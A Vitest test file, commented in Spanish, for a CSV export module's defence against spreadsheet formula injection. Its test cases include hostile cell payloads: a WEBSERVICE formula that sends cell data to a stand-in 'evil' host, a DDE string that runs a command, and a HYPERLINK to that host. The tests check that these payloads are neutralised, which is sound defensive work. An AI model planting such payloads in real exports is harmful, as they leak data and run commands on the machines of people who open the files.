import { describe, expect, it } from "vitest";
import { buildCsv, csvCell, sanitizeCsvCell } from "./csv";

/**
 * RL-A-03. La versión anterior sólo duplicaba comillas, así que una nota que
 * empezara con `=` llegaba intacta al archivo y Excel la evaluaba al abrirlo.
 * Notas, destino, transportista y chofer son texto libre que carga cualquier
 * operador, de modo que el vector estaba al alcance de un OPERATOR.
 */

describe("sanitizeCsvCell — neutraliza fórmulas", () => {
  it.each([
    ["=1+1", "fórmula directa"],
    ["=WEBSERVICE(\"http://evil/?d=\"&A1)", "exfiltración por WEBSERVICE"],
    ["=cmd|'/c calc'!A1", "ejecución por DDE"],
    ["+1+1", "fórmula con signo más"],
    ["@SUM(A1:A9)", "sintaxis heredada de Lotus"],
    ["-2+3", "resta que sí es fórmula"],
  ])("antepone apóstrofo a %j (%s)", (entrada) => {
    expect(sanitizeCsvCell(entrada)).toBe(`'${entrada}`);
  });

  it("también con espacios delante — Excel los ignora al decidir si es fórmula", () => {
    expect(sanitizeCsvCell("   =1+1")).toBe("'   =1+1");
  });

  it.each([["\t=1+1", "tabulación"], ["\r=1+1", "retorno de carro"], ["\n=1+1", "salto de línea"]])(
    "neutraliza el encadenado por %s",
    (entrada) => {
      expect(sanitizeCsvCell(entrada)).toBe(`'${entrada}`);
    },
  );
});

describe("sanitizeCsvCell — no toca lo que no es peligroso", () => {
  it.each([
    "Retiro parcial del lote L-2447",
    "TRANSPORTES DEL ESTE S.A.",
    "1000",
    "1.234,56",
    "2026-08-31 14:30",
    "",
  ])("deja intacto %j", (entrada) => {
    expect(sanitizeCsvCell(entrada)).toBe(entrada);
  });

  it("deja pasar el guion suelto con el que los reportes marcan un campo vacío", () => {
    // Escaparlo llenaría de apóstrofos toda la planilla: casi todos los campos
    // opcionales de un remito salen como "-".
    expect(sanitizeCsvCell("-")).toBe("-");
  });

  it.each(["-100", "-1.234,56", "-1,234.56", "-0,5"])(
    "deja pasar el número negativo %j para no romper los totales",
    (entrada) => {
      expect(sanitizeCsvCell(entrada)).toBe(entrada);
    },
  );

  it("acepta números, no sólo strings", () => {
    expect(sanitizeCsvCell(-1250.5)).toBe("-1250.5");
    expect(sanitizeCsvCell(0)).toBe("0");
  });

  it("null y undefined se vuelven celda vacía", () => {
    expect(sanitizeCsvCell(null)).toBe("");
    expect(sanitizeCsvCell(undefined)).toBe("");
  });
});

describe("csvCell — entrecomillado", () => {
  it("entrecomilla siempre", () => {
    expect(csvCell("hola")).toBe('"hola"');
  });

  it("duplica las comillas internas", () => {
    expect(csvCell('dijo "listo"')).toBe('"dijo ""listo"""');
  });

  it("neutraliza antes de entrecomillar — entrecomillar solo no protege", () => {
    expect(csvCell("=1+1")).toBe(`"'=1+1"`);
  });

  it("una fórmula con comillas queda neutralizada y escapada a la vez", () => {
    expect(csvCell('=HYPERLINK("http://evil")')).toBe(`"'=HYPERLINK(""http://evil"")"`);
  });

  it("una coma dentro del valor no parte la columna", () => {
    expect(csvCell("Asunción, Paraguay")).toBe('"Asunción, Paraguay"');
  });
});

describe("buildCsv", () => {
  it("separa filas con CRLF, como pide RFC 4180", () => {
    expect(buildCsv([["a", "b"], ["c", "d"]])).toBe('"a","b"\r\n"c","d"');
  });

  it("un salto de línea dentro de una celda no rompe la fila", () => {
    expect(buildCsv([["línea1\nlínea2"]])).toBe('"línea1\nlínea2"');
  });
});
